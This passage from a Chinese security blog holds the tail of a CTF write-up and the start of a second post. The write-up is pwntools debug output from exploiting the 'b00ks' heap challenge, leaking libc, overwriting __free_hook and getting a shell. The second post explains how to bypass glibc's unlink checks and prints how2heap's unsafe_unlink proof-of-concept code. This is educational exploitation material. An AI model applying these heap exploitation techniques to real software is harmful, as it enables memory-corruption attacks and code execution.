new book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x8f</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  |<span class="number">0000</span>|<span class="number">0000</span>|<span class="number">0000</span>|<span class="number">0000</span>|</span><br><span class="line">*</span><br><span class="line"><span class="number">00000070</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  e0 <span class="number">83</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  |····|····|··uU|UU··|</span><br><span class="line"><span class="number">00000080</span>  e0 <span class="number">83</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  ff ff <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>a     |··uU|UU··|····|···|</span><br><span class="line"><span class="number">0000008</span>f</span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'5\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x13</span> bytes:</span><br><span class="line"><span class="string">'Enter author name: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x21</span> bytes:</span><br><span class="line"><span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'</span></span><br><span class="line">[*] [+] Leak mmap-libc offset</span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[*] </span><br><span class="line"><span class="number">1.</span> Create a book</span><br><span class="line"><span class="number">2.</span> Delete a book</span><br><span class="line"><span class="number">3.</span> Edit a book</span><br><span class="line"><span class="number">4.</span> Print book detail</span><br><span class="line"><span class="number">5.</span> Change current author name</span><br><span class="line"><span class="number">6.</span> Exit</span><br><span class="line">&gt; </span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'4\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x113</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">31</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">10</span> e0 fa f7  |ID: |<span class="number">1</span>·Na|me: |····|</span><br><span class="line"><span class="number">00000010</span>  ff <span class="number">7</span>f <span class="number">0</span>a <span class="number">44</span>  <span class="number">65</span> <span class="number">73</span> <span class="number">63</span> <span class="number">72</span>  <span class="number">69</span> <span class="number">70</span> <span class="number">74</span> <span class="number">69</span>  <span class="number">6</span>f <span class="number">6</span>e <span class="number">3</span>a <span class="number">20</span>  |···D|escr|ipti|on: |</span><br><span class="line"><span class="number">00000020</span>  <span class="number">10</span> e0 fa f7  ff <span class="number">7</span>f <span class="number">0</span>a <span class="number">41</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6</span>f  <span class="number">72</span> <span class="number">3</span>a <span class="number">20</span> <span class="number">61</span>  |····|···A|utho|r: a|</span><br><span class="line"><span class="number">00000030</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |aaaa|aaaa|aaaa|aaaa|</span><br><span class="line"><span class="number">00000040</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span>a  |aaaa|aaaa|aaaa|aaa·|</span><br><span class="line"><span class="number">00000050</span>  <span class="number">49</span> <span class="number">44</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">32</span> <span class="number">0</span>a <span class="number">4</span>e <span class="number">61</span>  <span class="number">6</span>d <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>  <span class="number">2</span>f <span class="number">62</span> <span class="number">69</span> <span class="number">6</span>e  |ID: |<span class="number">2</span>·Na|me: |/bin|</span><br><span class="line"><span class="number">00000060</span>  <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">0</span>a  <span class="number">44</span> <span class="number">65</span> <span class="number">73</span> <span class="number">63</span>  <span class="number">72</span> <span class="number">69</span> <span class="number">70</span> <span class="number">74</span>  <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">3</span>a  |/sh·|Desc|ript|ion:|</span><br><span class="line"><span class="number">00000070</span>  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">32</span> <span class="number">20</span> <span class="number">64</span>  <span class="number">65</span> <span class="number">73</span> <span class="number">0</span>a <span class="number">41</span>  <span class="number">75</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6</span>f  | boo|k2 d|es·A|utho|</span><br><span class="line"><span class="number">00000080</span>  <span class="number">72</span> <span class="number">3</span>a <span class="number">20</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |r: a|aaaa|aaaa|aaaa|</span><br><span class="line"><span class="number">00000090</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  |aaaa|aaaa|aaaa|aaaa|</span><br><span class="line"><span class="number">000000</span>a0  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span>a  <span class="number">0</span>a <span class="number">31</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">43</span> <span class="number">72</span> <span class="number">65</span> <span class="number">61</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">20</span> <span class="number">61</span>  |aaa·|·<span class="number">1.</span> |Crea|te a|</span><br><span class="line"><span class="number">000000</span>b0  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">32</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">44</span> <span class="number">65</span> <span class="number">6</span>c  <span class="number">65</span> <span class="number">74</span> <span class="number">65</span> <span class="number">20</span>  | boo|k·<span class="number">2.</span>| Del|ete |</span><br><span class="line"><span class="number">000000</span>c0  <span class="number">61</span> <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f  <span class="number">6</span>f <span class="number">6</span>b <span class="number">0</span>a <span class="number">33</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">64</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">20</span> <span class="number">61</span>  |a bo|ok·<span class="number">3</span>|. Ed|it a|</span><br><span class="line"><span class="number">000000</span>d0  <span class="number">20</span> <span class="number">62</span> <span class="number">6</span>f <span class="number">6</span>f  <span class="number">6</span>b <span class="number">0</span>a <span class="number">34</span> <span class="number">2</span>e  <span class="number">20</span> <span class="number">50</span> <span class="number">72</span> <span class="number">69</span>  <span class="number">6</span>e <span class="number">74</span> <span class="number">20</span> <span class="number">62</span>  | boo|k·<span class="number">4.</span>| Pri|nt b|</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">6</span>f <span class="number">6</span>f <span class="number">6</span>b <span class="number">20</span>  <span class="number">64</span> <span class="number">65</span> <span class="number">74</span> <span class="number">61</span>  <span class="number">69</span> <span class="number">6</span>c <span class="number">0</span>a <span class="number">35</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">43</span> <span class="number">68</span>  |ook |deta|il·<span class="number">5</span>|. Ch|</span><br><span class="line"><span class="number">000000</span>f0  <span class="number">61</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">65</span>  <span class="number">20</span> <span class="number">63</span> <span class="number">75</span> <span class="number">72</span>  <span class="number">72</span> <span class="number">65</span> <span class="number">6</span>e <span class="number">74</span>  <span class="number">20</span> <span class="number">61</span> <span class="number">75</span> <span class="number">74</span>  |ange| cur|rent| aut|</span><br><span class="line"><span class="number">00000100</span>  <span class="number">68</span> <span class="number">6</span>f <span class="number">72</span> <span class="number">20</span>  <span class="number">6</span>e <span class="number">61</span> <span class="number">6</span>d <span class="number">65</span>  <span class="number">0</span>a <span class="number">36</span> <span class="number">2</span>e <span class="number">20</span>  <span class="number">45</span> <span class="number">78</span> <span class="number">69</span> <span class="number">74</span>  |hor |name|·<span class="number">6.</span> |Exit|</span><br><span class="line"><span class="number">00000110</span>  <span class="number">0</span>a <span class="number">3</span>e <span class="number">20</span>                                            |·&gt; |</span><br><span class="line"><span class="number">00000113</span></span><br><span class="line">[+]mmap_addr: <span class="number">0x7ffff7fae010</span></span><br><span class="line">system addr: <span class="number">0x7ffff7e275d0</span></span><br><span class="line">binsh addr: <span class="number">0x7ffff7f63573</span></span><br><span class="line">__free_hook: <span class="number">0x7ffff7f9d8e8</span></span><br><span class="line">[+]overwrite free hook</span><br><span class="line"><span class="number">5215</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to edit: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1c</span> bytes:</span><br><span class="line"><span class="string">'Enter new book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  e8 d8 f9 f7  ff <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>a                        |····|····|·|</span><br><span class="line"><span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x24</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to edit: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1c</span> bytes:</span><br><span class="line"><span class="string">'Enter new book description: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  d0 <span class="number">75</span> e2 f7  ff <span class="number">7</span>f <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>a                        |·u··|····|·|</span><br><span class="line"><span class="number">00000009</span></span><br><span class="line">[DEBUG] Received <span class="number">0x6f</span> bytes:</span><br><span class="line"><span class="string">'\n'</span></span><br><span class="line"><span class="string">'1. Create a book\n'</span></span><br><span class="line"><span class="string">'2. Delete a book\n'</span></span><br><span class="line"><span class="string">'3. Edit a book\n'</span></span><br><span class="line"><span class="string">'4. Print book detail\n'</span></span><br><span class="line"><span class="string">'5. Change current author name\n'</span></span><br><span class="line"><span class="string">'6. Exit\n'</span></span><br><span class="line"><span class="string">'&gt; '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x26</span> bytes:</span><br><span class="line"><span class="string">'Enter the book id you want to delete: '</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line"><span class="string">'whoami\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'asan\n'</span></span><br><span class="line">asan</span><br></pre></td></tr></table></figure>
<h1><span id="reference">Reference</span></h1><ul>
<li><a href="https://amritabi0s.wordpress.com/2016/06/11/asis-ctf-quals-2016-b00ks-writeup/" target="_blank" rel="external">https://amritabi0s.wordpress.com/2016/06/11/asis-ctf-quals-2016-b00ks-writeup/</a></li>
<li><a href="https://bbs.pediy.com/thread-225611.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-225611.htm</a></li>
<li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/off_by_one/" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/heap/off_by_one/</a></li>
<li><a href="https://www.jianshu.com/p/3dffbf482602" target="_blank" rel="external">https://www.jianshu.com/p/3dffbf482602</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/10/20/unlink_detail/" itemprop="url">
                  堆利用 unlink 实战详解
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-10-20T17:00:00+08:00" content="2018-10-20">
              2018-10-20
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/heap/" itemprop="url" rel="index">
                    <span itemprop="name">heap</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/10/20/unlink_detail/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/20/unlink_detail/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>堆溢出利用的精髓</strong>就是：用精心构造的数据去溢出下一个 chunk 的 header，改写 chunk header 中的前向指针 (flink) 和后向指针 (blink) ，然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
<p>unlink 利用方式就是在 free 的时候得到任意地址写入任意数据的机会。</p>
<p>利用条件：</p>
<ul>
<li>连续的两个堆内存空间，第一个堆可溢出，覆写第二个堆 header</li>
<li>free 第二个堆</li>
</ul>
<p>本文对 unlink 检查机制及绕过做简单分析，然后实战分析 how2heap 里 unsafe_unlink。</p>
<h1><span id="unlink-检查机制及绕过">unlink 检查机制及绕过</span></h1><p>unlink 是一个宏。在最初 unlink 实现的时候，其实是没有对双向链表检查的。代码大致如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BK=second-&gt;bk</span><br><span class="line">FD=second-&gt;fd</span><br><span class="line">FD-&gt;bk=BK</span><br><span class="line">BK-&gt;fd=FD</span><br></pre></td></tr></table></figure>
<p>而以最新的 glibc 2.27 为例，则早已添加了检查机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">	<span class="meta-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">	malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);			      \</span><br><span class="line">	FD = P-&gt;fd;								      \</span><br><span class="line">	BK = P-&gt;bk;								      \</span><br><span class="line">	<span class="meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">	malloc_printerr (<span class="string">"corrupted double-linked list"</span>);			      \</span><br><span class="line">	<span class="meta-keyword">else</span> &#123;								      \</span><br><span class="line">		FD-&gt;bk = BK;							      \</span><br><span class="line">		BK-&gt;fd = FD;							      \</span><br><span class="line">		<span class="meta-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span><br><span class="line">		&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span><br><span class="line">			<span class="meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span><br><span class="line">			|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">			malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   \</span><br><span class="line">			<span class="meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span><br><span class="line">				<span class="meta-keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">				FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">				<span class="meta-keyword">else</span> &#123;							      \</span><br><span class="line">					FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">					FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">					P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">					P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">				&#125;							      \</span><br><span class="line">			&#125; <span class="meta-keyword">else</span> &#123;							      \</span><br><span class="line">				P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">				P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">			&#125;								      \</span><br><span class="line">		&#125;								      \</span><br><span class="line">	&#125;									      \</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这里会修正指针，FD-&gt;bk = P,BK-&gt;fd = P</p>
<p>这样要满足条件的话，就需要预先构造合适的条件来 bypass 这个限制：</p>
<ul>
<li>P-&gt;fd-&gt;bk = P</li>
<li>P-&gt;bk-&gt;fd = P</li>
</ul>
<p>这样在 free unlink 后：</p>
<ul>
<li>FD-&gt;bk = BK 等价于 P = P-&gt;bk</li>
<li>BK-&gt;fd = FD 等价于 P = P-&gt;fd</li>
</ul>
<h1><span id="unsafe-unlink-构造分析">unsafe unlink 构造分析</span></h1><p>这里以 how2heap 里最新版的 unsafe_unlink.c : <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c</a> 为例，分析 bypass 及 fake 过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) != False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析环境：</p>
<ul>
<li>OS:wsl debian 4.4.0 64bits</li>
